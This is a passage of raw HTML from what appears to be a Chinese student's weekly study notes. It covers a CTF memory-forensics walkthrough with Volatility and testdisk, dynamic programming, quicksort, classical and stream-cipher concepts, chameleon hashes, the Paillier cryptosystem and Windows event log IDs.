class="number">0x9a</span>,<span class="number">0x36</span> &#125;;</span><br><span class="line"><span class="type">char</span> paswd[<span class="number">256</span>] = &#123; <span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0xa7</span>,<span class="number">0x87</span>,<span class="number">0x7f</span>,<span class="number">0xc7</span>,<span class="number">0xb8</span>,<span class="number">0xf7</span>,<span class="number">0x0e</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x15</span>,<span class="number">0x6b</span>,<span class="number">0xc3</span>,<span class="number">0xd5</span>,<span class="number">0x3d</span>,<span class="number">0x9d</span>,<span class="number">0x4d</span>,<span class="number">0xe1</span>,<span class="number">0x3c</span>,<span class="number">0x5c</span>,<span class="number">0x9e</span>,<span class="number">0xab</span>,<span class="number">0x9f</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0xbe</span>,<span class="number">0x6b</span>,<span class="number">0x3f</span> &#125;;</span><br><span class="line"><span class="type">char</span> rc4_key[<span class="number">256</span>] = &#123; <span class="string">&quot;What_should_I_do&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>

<p><em>定义数组，不完全初始化以及完全初始化，未填满的部分全部为0</em></p>
<h1 id="230308"><a href="#230308" class="headerlink" title="230308"></a>230308</h1><h2 id="【护网杯2018】easy-dump"><a href="#【护网杯2018】easy-dump" class="headerlink" title="【护网杯2018】easy_dump"></a>【护网杯2018】easy_dump</h2><p>###利用vol查看镜像信息</p>
<p><code>vol.py -f easy_dump.img imageinfo</code><img src="/2023/12/31/WeeklyStudy/image-20230309102823595.png" class="" title="image-20230309102823595"></p>
<p><em>一般以镜像前1，2个操作系统为分析重点，eg: Win7SP1x64</em></p>
<h3 id="指定镜像进行进程扫描"><a href="#指定镜像进行进程扫描" class="headerlink" title="指定镜像进行进程扫描"></a>指定镜像进行进程扫描</h3><p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pslist</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 pstree</code></p>
<p><code>vol.py -f easy_dump.img --profile=WinSP1x64 psscan</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309103714601.png" class="" title="image-20230309103714601">

<p><em>发现可疑进程<code>notepad.exe</code>，那么我们直接把记事本内容给提取出来。</em></p>
<h3 id="记事本内容dump"><a href="#记事本内容dump" class="headerlink" title="记事本内容dump"></a>记事本内容dump</h3><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 memdump -p 2616 -D ./</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309104153529.png" class="" title="image-20230309104153529">

<p><em>把记事本内容dump出来，利用string-grep对dmp文件内容进行检索。</em></p>
<h3 id="记事本内容直接搜索"><a href="#记事本内容直接搜索" class="headerlink" title="记事本内容直接搜索"></a>记事本内容直接搜索</h3><p><code>strings -eb 2616.dmp | grep flag </code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309111116109.png" class="" title="image-20230309111116109">

<p><em>-el 也适用， -u相关用法不太不清楚具体案例，从而得到提示，找jpg文件。</em></p>
<h3 id="根据提示查找图片并导出"><a href="#根据提示查找图片并导出" class="headerlink" title="根据提示查找图片并导出"></a>根据提示查找图片并导出</h3><p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 filescan | grep .jpg</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230309111924885.png" class="" title="image-20230309111924885">

<p><em>grep进行过滤，也可用其他形式进行检索，主体包含jpg即可。</em></p>
<p><code>vol.py -f easy_dump.img --profile=Win7SP1x64 dumpfiles -Q 0x000000002408c460 -D ./</code></p>
<img src="/2023/12/31/WeeklyStudy/phos.jpg" class="" title="phos.jpg">

<p><em>直接导出的就是<code>file:xxxx</code>的格式，我们直接按照需求把文件改成原始文件名即可，eg: phos.jpg</em></p>
<h3 id="图片隐写分析"><a href="#图片隐写分析" class="headerlink" title="图片隐写分析"></a>图片隐写分析</h3><p>有图片就回归到图片方面的隐写分析之上。</p>
<p><code>binwalk</code>分析，发现存在<code>zip</code>，那么直接对其进行<code>foremost</code>提取。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309112732389.png" class="" title="image-20230309112732389">

<p>提取出来一个<code>message.img</code>。</p>
<p>再次进行提取操作，本次使用<code>binwalk -e</code> 进行提取<code>hint.txt</code>。</p>
<p><em>使用foremost无法分离出来<code>hint.txt</code>文件</em></p>
<h3 id="生成二维码"><a href="#生成二维码" class="headerlink" title="生成二维码"></a>生成二维码</h3><ul>
<li><code>gnuplot</code>转换</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gnuplot         </span><br><span class="line">        G N U P L O T</span><br><span class="line">        Version <span class="number">5.4</span> patchlevel <span class="number">4</span>    last modified <span class="number">2022</span>-07-<span class="number">10</span> </span><br><span class="line"></span><br><span class="line">        Copyright (C) <span class="number">1986</span>-<span class="number">1993</span>, <span class="number">1998</span>, <span class="number">2004</span>, <span class="number">2007</span>-<span class="number">2022</span></span><br><span class="line">        Thomas Williams, Colin Kelley <span class="keyword">and</span> many others</span><br><span class="line"></span><br><span class="line">        gnuplot home:     http://www.gnuplot.info</span><br><span class="line">        faq, bugs, etc:   <span class="built_in">type</span> <span class="string">&quot;help FAQ&quot;</span></span><br><span class="line">        immediate <span class="built_in">help</span>:   <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>  (plot window: hit <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Terminal <span class="built_in">type</span> <span class="keyword">is</span> now <span class="string">&#x27;qt&#x27;</span></span><br><span class="line">gnuplot&gt; plot<span class="string">&#x27;hint.txt&#x27;</span></span><br><span class="line">gnuplot&gt; </span><br></pre></td></tr></table></figure>

<p><em>然后直接输出二维码图片</em></p>
<ul>
<li>脚本转换 <em>暂且没成功……</em> -&gt; <em><strong>成功了，原终端为agg，无图形界面，需要切换为图形界面显示的终端TkAgg</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="comment"># keypoint</span></span><br><span class="line">matplotlib.use(<span class="string">&#x27;TkAgg&#x27;</span>) <span class="comment"># keypoint</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    datas = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        arr = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        x.append(<span class="built_in">int</span>(arr[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(arr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;ks&#x27;</span>, ms=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><em>扫描即可得到信息：1. 维吉尼亚密钥为<code>aeolus</code> 2. 加密后的密文被删除了</em></p>
<h3 id="恢复镜像删除信息"><a href="#恢复镜像删除信息" class="headerlink" title="恢复镜像删除信息"></a>恢复镜像删除信息</h3><p>使用<code>testdisk</code>进行恢复：<code>testdisk message.img</code>，进入相应的操作界面。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309133925809.png" class="" title="image-20230309133925809">

<p>进入<code>Proceed</code>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134503976.png" class="" title="image-20230309134503976">

<p>进入<code>None</code>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134823519.png" class="" title="image-20230309134823519">

<p>因为涉及删除的文件，所以直接找该功能模块<code>Undelete</code>。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134918426.png" class="" title="image-20230309134918426">

<p>找到标红处，说明该处存在删除文件。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135112638.png" class="" title="image-20230309135112638">

<p>按<code>c</code>确定文件以及路径之后，出现该红框内内容说明导出成功。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135208693.png" class="" title="image-20230309135208693">

<p>到保存路径之下，使用<code>ls -a</code>发现保存下来的文件，直接利用<code>strings</code>查找字符串即可。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135334653.png" class="" title="image-20230309135334653">

<p>找到加密后的密文，使用在线解密网站结合密钥解密即可，最终得到相应的flag。</p>
<h1 id="230309"><a href="#230309" class="headerlink" title="230309"></a>230309</h1><h2 id="strings用法"><a href="#strings用法" class="headerlink" title="strings用法"></a>strings用法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Usage: strings [option(s)] [file(s)]</span><br><span class="line"> Display printable strings <span class="keyword">in</span> [file(s)] (stdin by default)</span><br><span class="line"> The options are:</span><br><span class="line">  -a - --<span class="built_in">all</span>                Scan the entire file, <span class="keyword">not</span> just the data section [default]</span><br><span class="line">  -d --data                 Only scan the data sections <span class="keyword">in</span> the file</span><br><span class="line">  -f --<span class="built_in">print</span>-file-name      Print the name of the file before each string</span><br><span class="line">  -n &lt;number&gt;               Locate &amp; <span class="built_in">print</span> <span class="built_in">any</span> sequence of at least &lt;number&gt;</span><br><span class="line">    --<span class="built_in">bytes</span>=&lt;number&gt;         displayable characters.  (The default <span class="keyword">is</span> <span class="number">4</span>).</span><br><span class="line">  -t --radix=&#123;o,d,x&#125;        Print the location of the string <span class="keyword">in</span> base <span class="number">8</span>, <span class="number">10</span> <span class="keyword">or</span> <span class="number">16</span></span><br><span class="line">  -w --include-<span class="built_in">all</span>-whitespace Include <span class="built_in">all</span> whitespace <span class="keyword">as</span> valid string characters</span><br><span class="line">  -o                        An alias <span class="keyword">for</span> --radix=o</span><br><span class="line">  -T --target=&lt;BFDNAME&gt;     Specify the binary file <span class="built_in">format</span></span><br><span class="line">  -e --encoding=&#123;s,S,b,l,B,L&#125; Select character size <span class="keyword">and</span> endianness:</span><br><span class="line">                            s = <span class="number">7</span>-bit, S = <span class="number">8</span>-bit, &#123;b,l&#125; = <span class="number">16</span>-bit, &#123;B,L&#125; = <span class="number">32</span>-bit</span><br><span class="line">  --unicode=&#123;default|show|invalid|<span class="built_in">hex</span>|escape|highlight&#125;</span><br><span class="line">  -U &#123;d|s|i|x|e|h&#125;          Specify how to treat UTF-<span class="number">8</span> encoded unicode characters</span><br><span class="line">  -s --output-separator=&lt;string&gt; String used to separate strings <span class="keyword">in</span> output.</span><br><span class="line"><span class="meta">  @&lt;file&gt;                   Read options from &lt;file&gt;</span></span><br><span class="line">  -h --<span class="built_in">help</span>                 Display this information</span><br><span class="line">  -v -V --version           Print the program<span class="string">&#x27;s version number</span></span><br><span class="line"><span class="string">strings: supported targets: elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pe-x86-64 pei-x86-64 elf64-little elf64-big elf32-little elf32-big pe-bigobj-x86-64 pe-i386 pdb srec symbolsrec verilog tekhex binary ihex plugin</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<h1 id="230310"><a href="#230310" class="headerlink" title="230310"></a>230310</h1><h2 id="新讲述视角"><a href="#新讲述视角" class="headerlink" title="新讲述视角"></a>新讲述视角</h2><h3 id="关于逆元的作用"><a href="#关于逆元的作用" class="headerlink" title="关于逆元的作用"></a>关于逆元的作用</h3><img src="/2023/12/31/WeeklyStudy/image-20230310103125778.png" class="" title="image-20230310103125778">

<h3 id="Dynamic-Programming-DP"><a href="#Dynamic-Programming-DP" class="headerlink" title="Dynamic Programming-DP"></a>Dynamic Programming-DP</h3><h4 id="贪心算法引论"><a href="#贪心算法引论" class="headerlink" title="贪心算法引论"></a>贪心算法引论</h4><blockquote>
<p><a href="https://www.zhihu.com/question/23995189/answer/613096905">https://www.zhihu.com/question/23995189/answer/613096905</a></p>
</blockquote>
<p>​		先来看看生活中经常遇到的事吧——假设您是个土豪，身上带了足够的1、5、10、20、50、100元面值的钞票。现在您的目标是凑出某个金额w，<strong>需要用到尽量少的钞票。</strong></p>
<p>　　依据生活经验，我们显然可以采取这样的策略：能用100的就尽量用100的，否则尽量用50的……依次类推。在这种策略下，666&#x3D;6×100+1×50+1×10+1×5+1×1，共使用了10张钞票。</p>
<p>　　这种策略称为“<strong>贪心</strong>”：假设我们面对的局面是“需要凑出w”，<strong>贪心策略会尽快让w变得更小</strong>。能让w少100就尽量让它少100，这样我们接下来面对的局面就是凑出w-100。长期的生活经验表明，<a href="https://www.zhihu.com/search?q=%E8%B4%AA%E5%BF%83%E7%AD%96%E7%95%A5&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">贪心策略</a>是正确的。</p>
<p>​		但是，如果我们换一组钞票的面值，贪心策略就也许不成立了。如果一个奇葩国家的钞票面额分别是1、5、11，那么我们在凑出15的时候，贪心策略会出错：<br>　　15&#x3D;1×11+4×1    （贪心策略使用了5张钞票）<br>　　15&#x3D;3×5               （正确的策略，只用3张钞票）<br>　　为什么会这样呢？贪心策略错在了哪里？</p>
<p><strong>鼠目寸光。</strong><br>　　刚刚已经说过，贪心策略的纲领是：“尽量使接下来面对的w更小”。这样，贪心策略在w&#x3D;15的局面时，会优先使用11来把w降到4；但是在这个问题中，凑出4的代价是很高的，必须使用4×1。如果使用了5，w会降为10，虽然没有4那么小，但是凑出10只需要两张5元。<br>　　在这里我们发现，贪心是一种<strong>只考虑眼前情况</strong>的策略。</p>
<p>​		我们能这样干，取决于问题的性质：求出f(n)，只需要知道几个更小的f(c)。<strong>我们将求解f(c)称作求解f(n)的“子问题”。</strong></p>
<p>　　<strong>这就是DP</strong>（动态规划，dynamic programming）.</p>
<p>　　<strong>将一个问题拆成几个子问题，分别求解这些子问题，即可推断出大问题的解</strong>。</p>
<h4 id="基本概念以及DP定义"><a href="#基本概念以及DP定义" class="headerlink" title="基本概念以及DP定义"></a>基本概念以及DP定义</h4><p>【<a href="https://www.zhihu.com/search?q=%E6%97%A0%E5%90%8E%E6%95%88%E6%80%A7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">无后效性</a>】</p>
<p>　　一旦f(n)确定，“我们如何凑出f(n)”就再也用不着了。</p>
<p>　　要求出f(15)，只需要知道f(14),f(10),f(4)的值，而f(14),f(10),f(4)是如何算出来的，对之后的问题没有影响。</p>
<p>　　<strong>“未来与过去无关”，</strong>这就是<strong>无后效性</strong>。</p>
<p>　　（严格定义：如果给定某一阶段的状态，则在这一阶段以后过程的发展不受这阶段以前各段状态的影响。）</p>
<p>【<a href="https://www.zhihu.com/search?q=%E6%9C%80%E4%BC%98%E5%AD%90%E7%BB%93%E6%9E%84&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">最优子结构</a>】</p>
<p>　　回顾我们对f(n)的定义：我们记“凑出n所需的<strong>最少</strong>钞票数量”为f(n).</p>
<p>　　f(n)的定义就已经蕴含了“最优”。利用w&#x3D;14,10,4的<strong>最优</strong>解，我们即可算出w&#x3D;15的<strong>最优</strong>解。</p>
<p>　　大问题的<strong>最优解</strong>可以由小问题的<strong>最优解</strong>推出，这个性质叫做“<a href="https://www.zhihu.com/search?q=%E6%9C%80%E4%BC%98%E5%AD%90%E7%BB%93%E6%9E%84%E6%80%A7%E8%B4%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">最优子结构性质</a>”。</p>
<p>　　引入这两个概念之后，我们如何判断一个问题能否使用DP解决呢？</p>
<p>　　<strong>能将大问题拆成几个小问题，且满足无后效性、最优子结构性质。</strong></p>
<h4 id="C语言实现快排算法，以及从概念理解算法运行"><a href="#C语言实现快排算法，以及从概念理解算法运行" class="headerlink" title="C语言实现快排算法，以及从概念理解算法运行"></a>C语言实现快排算法，以及从概念理解算法运行</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 左闭右开</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(l &gt;= r - <span class="number">1</span>) <span class="keyword">return</span>;              <span class="comment">// 只有单个元素待排序，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flag = a[rand() % (r-l) + l];   <span class="comment">// 随机取哨兵</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> p = l, q = r;       </span><br><span class="line">    <span class="comment">// tmp[l,p): 比 flag 小的；tmp[q, r): 比 flag 大的</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l; i&lt;r; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] &lt; flag)</span><br><span class="line">            tmp[p++] = a[i]; <span class="comment">// 比哨兵矮的放在左边</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt; flag)</span><br><span class="line">            tmp[--q] = a[i]; <span class="comment">// 比哨兵高的放在右边</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=p; i&lt;q; i++)   <span class="comment">// 与哨兵一样高的</span></span><br><span class="line">        tmp[i] = flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l; i&lt;r; i++)   <span class="comment">// 覆盖回 a 数组</span></span><br><span class="line">        a[i] = tmp[i];</span><br><span class="line">    </span><br><span class="line">    quickSort(l, p);         <span class="comment">// 递归</span></span><br><span class="line">    quickSort(q, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kerckhoffs-原则"><a href="#Kerckhoffs-原则" class="headerlink" title="Kerckhoffs 原则"></a>Kerckhoffs 原则</h2><blockquote>
<p>加密方法不应该被保密，唯一需要保密的是通信双方的 key.<br>(Kerckhoffs’s principle, 柯克霍夫原则)</p>
</blockquote>
<p>柯克霍夫原则要求，一个加密方案的安全性，仅取决于密钥的安全性，而不取决于算法的秘密。接受 Kerckhoffs 原则会带来很多好处：首先，由于加密算法是公开的，通讯各方只需要保密密钥（这显然比加密算法要短，按常理来讲，越短的东西越容易保密）。另外，如果密钥泄露了，双方只需要改个新的密钥就能继续安全通信（若不遵循 Kerckhoffs 原则，一旦泄露算法就需要重新设计加密方案）。最后，遵循 Kerckhoffs 原则可以带来标准化的好处：多人通讯时，可以采用相同的算法而选择不同的密钥，这样程序可以复用。</p>
<h2 id="充分密钥空间原则"><a href="#充分密钥空间原则" class="headerlink" title="充分密钥空间原则"></a>充分密钥空间原则</h2><blockquote>
<p>任何安全的加密方案，其密钥空间$\mathcal{M}$必须能抵御穷举搜索。<br>(这一原则在 $|\mathcal{M}|$&gt;$|\mathcal{K}|$ 时有效。若可能的明文比可能的密钥还少，枚举出所有可能的密钥，解密之后会获得比明文空间还大的候选明文集合。)</p>
</blockquote>
<p>根据当前计算机的计算能力，密钥空间需要非常大，例如$2^{70}$.</p>
<p>需要注意的是，满足充分密钥空间原则的加密方案，未必就是安全的。</p>
<h2 id="index-of-coincidence-IoC，重合因子"><a href="#index-of-coincidence-IoC，重合因子" class="headerlink" title="index of coincidence (IoC，重合因子)"></a>index of coincidence (IoC，重合因子)</h2><img src="/2023/12/31/WeeklyStudy/image-20230310132521922.png" class="" title="image-20230310132521922">

<p>IoC方式查找维吉尼亚密钥长度。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230310132739640.png" class="" title="image-20230310132739640">

<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>上面介绍的利用 PRG（伪随机发生器）的异或方案，称为<strong>流密码</strong>。想要执行加密，是先生成一个伪随机的比特流，然后用这个比特流来与明文异或，产生密文。由于流密码方案与生成比特流的方案是绑定的，我们以后直接用“流密码”来简称伪随机比特串发生器。</p>
<p>实际应用中，有 RC4 等流密码方案。RC4 不太安全，LFSR 非常不安全。目前来看，主张采用分组密码来进行加密；如果一定要用流密码，一般用分组密码造一个流出来。</p>
<h2 id="Latex字母显示"><a href="#Latex字母显示" class="headerlink" title="Latex字母显示"></a>Latex字母显示</h2><ul>
<li>希腊字母$\Alpha$</li>
<li>黑板粗体$\mathbb{A}$</li>
<li>正粗体$\mathbf{A}$</li>
<li>斜体数字$\mathit{0123456789}$</li>
<li>罗马体$\mathrm{A}$</li>
<li>哥特体$\mathfrak{A}$</li>
<li>手写体$\mathcal{A}$</li>
<li>希伯来字母$\aleph \beth \gimel \daleth$</li>
</ul>
<h1 id="230313"><a href="#230313" class="headerlink" title="230313"></a>230313</h1><h2 id="准备搭建框架"><a href="#准备搭建框架" class="headerlink" title="准备搭建框架"></a>准备搭建框架</h2><blockquote>
<p><a href="https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/</a></p>
</blockquote>
<p>感觉前置介绍还是有必要的，级别：低级</p>
<p>主体介绍：发展趋势，推广应用</p>
<ul>
<li>发展趋势：后量子密码，密码学发展历程</li>
<li>推广应用：安全协议，区块链，安全多方计算</li>
<li>发展趋势<ul>
<li>去信任化</li>
<li>隐私数据处理&#x2F;模糊</li>
<li>后量子密码</li>
</ul>
</li>
</ul>
<h2 id="经典Chameleon-Hash构造"><a href="#经典Chameleon-Hash构造" class="headerlink" title="经典Chameleon Hash构造"></a>经典Chameleon Hash构造</h2><p>下面我们来看一个经典的Chameleon Hash构造。这个构造是2000年提出的，最为直观和经典的Chameleon Hash构造。有兴趣的朋友们可以参看下面的论文。</p>
<blockquote>
<p>Krawczyk H, Rabin T. Chameleon hashing and signatures. NDSS 2000: 143-154.</p>
</blockquote>
<ul>
<li>(sk, pk) &#x3D; KeyGen($\lambda$)。首先，构造一个满足安全常数的循环群G（比如mod p群就可以）。选择一个G群的生成元g，选择一个随机的指数x，计算h &#x3D; $g^x$。那么，私钥sk &#x3D; x，公钥pk &#x3D; (g, h)。</li>
<li>Hm &#x3D; Hash(pk, m, r)。给定消息m以及一个随机的指数r，Hash的结果为$Hm &#x3D; g^m h^r$。</li>
<li>r’ &#x3D; UForge(sk, m, r, m’)。算法简单地根据等式$m + xr &#x3D; m’ + xr’$来计算$r’$。</li>
</ul>
<p>我们注意到，因为$m+xr &#x3D; m’+xr’$成立，因此Hash的结果中有$g^{m} \cdot h^{r} &#x3D; g^{m} \cdot g^{(xr)} &#x3D; g^{(m + xr)} &#x3D; g^{(m’ + xr’)} &#x3D; g^{m’} \cdot h^{r’}$。伪造成立。</p>
<p>然而，对于其他人来说，其不知道x的值，因此，如果想构造出一个碰撞，其他人必须在指数上面解方程$g^(m + xr) &#x3D; g^(m’ + xr’)$，也就是说去求一个离散对数问题。但是，离散对数问题直到现在为止都没有一个很快的算法（最快也是指数级的）。因此对于其他人来说，很难找到碰撞。</p>
<p>我们可以看出，这个算法非常的巧妙。利用了离散对数问题求解困难这个事实，构造了一个Chameleon hash。</p>
<h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>B+树（IO次数更少；查询性能稳定；范围查询简便）</p>
<p>B-树</p>
<h1 id="230314"><a href="#230314" class="headerlink" title="230314"></a>230314</h1><h2 id="paillier-cryptosystem"><a href="#paillier-cryptosystem" class="headerlink" title="paillier cryptosystem"></a>paillier cryptosystem</h2><h3 id="The-first-pattern："><a href="#The-first-pattern：" class="headerlink" title="The first pattern："></a>The first pattern：</h3><ol>
<li>随机选择两个大质数$p$、$q$满足$gcd(pq, (p-1)*(q-1))$。</li>
<li>计算$n&#x3D;p<em>q，λ &#x3D; lcm(p-1, q-1) &#x3D; (p-1)</em>(q-1) &#x2F; gcd(p-1,q-1)$</li>
<li>选择随机整数$g$，$0&lt;g&lt;n^2$</li>
<li>定义$L(x) &#x3D; (x-1) &#x2F; n$</li>
<li>计算$μ &#x3D; (L(g^λ \mod n^2 ))^{-1} \mod n$</li>
<li>公钥为$(n，g)$</li>
<li>私钥为$(λ，μ)$</li>
</ol>
<h3 id="The-second-pattern（a-simpler-variant）："><a href="#The-second-pattern（a-simpler-variant）：" class="headerlink" title="The second pattern（a simpler variant）："></a>The second pattern（a simpler variant）：</h3><p>其余参数不变，主要改变了$g$，$λ$，$μ$的定义</p>
<ol>
<li>随机选择两个大质数$p$、$q$满足$gcd(pq, (p-1)*(q-1))$。</li>
<li>计算$n&#x3D;p<em>q，λ &#x3D; lcm(p-1, q-1) &#x3D; (p-1)</em>(q-1) &#x2F; gcd(p-1,q-1)$</li>
<li>定义$L(x) &#x3D; (x-1) &#x2F; n$</li>
<li>$g &#x3D; n+1$</li>
<li>$λ &#x3D; φ(n) &#x3D; (p-1)*(q-1)$</li>
<li>$μ &#x3D; φ(n)^{-1} \mod n$</li>
</ol>
<h3 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h3><ol>
<li>设$m$为要加密的消息，显然需要满足，$0 ≤ m ＜ n$</li>
<li>选择随机 $r$，保证$gcd(r, n) &#x3D; 1$</li>
<li>密文$c$：$c &#x3D; (g^m) *(r^n) \mod n^2$</li>
</ol>
<h3 id="Decryption"><a href="#Decryption" class="headerlink" title="Decryption"></a>Decryption</h3><ol>
<li>$m &#x3D; ( L( c^λ \mod n^2 ) \times μ ) \mod n$</li>
</ol>
<h1 id="230315"><a href="#230315" class="headerlink" title="230315"></a>230315</h1><ul>
<li><input checked="" disabled="" type="checkbox"> 博文-paillier-cryptosystema</li>
<li><input checked="" disabled="" type="checkbox"> paillier-cryptosystem1&#x2F;2</li>
</ul>
<p>经过证明之后，发现上证明需要用到一些定理。</p>
<h2 id="paillier1-x2F-2涉及定理"><a href="#paillier1-x2F-2涉及定理" class="headerlink" title="paillier1&#x2F;2涉及定理"></a>paillier1&#x2F;2涉及定理</h2><ul>
<li>费马小定理</li>
<li>欧拉函数</li>
</ul>
<h2 id="复现-not-RSA"><a href="#复现-not-RSA" class="headerlink" title="复现-not RSA"></a>复现-not RSA</h2><ul>
<li>mid</li>
<li>200</li>
<li>paillier-2</li>
</ul>
<h2 id="复现-paillier"><a href="#复现-paillier" class="headerlink" title="复现-paillier"></a>复现-paillier</h2><ul>
<li>mid</li>
<li>200</li>
<li>paillier-2</li>
</ul>
<h1 id="230316"><a href="#230316" class="headerlink" title="230316"></a>230316</h1><h2 id="lru-cache"><a href="#lru-cache" class="headerlink" title="lru_cache"></a>lru_cache</h2><p>lru_cache是通过著名的LCU算法来实现的，也就是最近最久未使用缓存淘汰算法。</p>
<h2 id="惊奇"><a href="#惊奇" class="headerlink" title="惊奇"></a>惊奇</h2><p>计算器居然有程序员类型的！</p>
<p>amazing！</p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>x64，实现分配栈空间，然后以分配的栈空间为基准进行数据的存放。</p>
<h1 id="230317"><a href="#230317" class="headerlink" title="230317"></a>230317</h1><h2 id="又战旗鼓之整活黑白夜的灰"><a href="#又战旗鼓之整活黑白夜的灰" class="headerlink" title="又战旗鼓之整活黑白夜的灰"></a>又战旗鼓之整活黑白夜的灰</h2><ul>
<li><code>_config.next.yml</code>新增<code>Darkmode JS</code><ul>
<li>修改默认按钮</li>
<li><code>pjax</code>默认为<code>true</code></li>
</ul>
</li>
<li>安装插件</li>
</ul>
<p><em><strong>&#x3D; &#x3D;, 怎么突然又可以了，神奇！</strong></em></p>
<ul>
<li>但代码又有点颜色怪异，稍微修改下代码颜色吧。</li>
</ul>
<h1 id="230320"><a href="#230320" class="headerlink" title="230320"></a>230320</h1><h2 id="Windows安全日志"><a href="#Windows安全日志" class="headerlink" title="Windows安全日志"></a>Windows安全日志</h2><h3 id="查看步骤"><a href="#查看步骤" class="headerlink" title="查看步骤"></a>查看步骤</h3><ul>
<li>事件查看器<ul>
<li>或 <code>eventvwr</code></li>
</ul>
</li>
<li>Windows日志<ul>
<li>安全</li>
</ul>
</li>
</ul>
<h3 id="文件以及格式"><a href="#文件以及格式" class="headerlink" title="文件以及格式"></a>文件以及格式</h3><ul>
<li><code>.evtx</code> （Win7以后）</li>
<li><code>.evt</code> （XP，server2003）</li>
</ul>
<h3 id="日志ID"><a href="#日志ID" class="headerlink" title="日志ID"></a>日志ID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统system：</span><br><span class="line"></span><br><span class="line">1074，查看计算机的开机、关机、重启的时间以及原因和注释。</span><br><span class="line"></span><br><span class="line">6005，表示日志服务已启动，用来判断正常开机进入系统。</span><br><span class="line"></span><br><span class="line">6006，表示日志服务已停止，用来判断系统关机。</span><br><span class="line"></span><br><span class="line">6009，表示非正常关机， 按ctrl、alt、delete键关机。</span><br><span class="line"></span><br><span class="line">41，表示系统在未先正常关机的情况下重新启动。当出现意外断电关机、系统崩溃时，出现此事件ID。</span><br><span class="line"></span><br><span class="line">4199，当发生TCP/IP地址冲突的时候，出现此事件ID，用来排查用户IP网络的问题。</span><br><span class="line"></span><br><span class="line">35,36,37，记录时间客户端状态信息，35表示更改时间源，36表示时间同步失败，37表示时间同步正常</span><br><span class="line"></span><br><span class="line">134，当出现时间同步源DNS解析失败时会出现此事件ID。</span><br><span class="line"></span><br><span class="line">7045，服务创建成功</span><br><span class="line"></span><br><span class="line">7030，服务创建失败</span><br><span class="line"></span><br><span 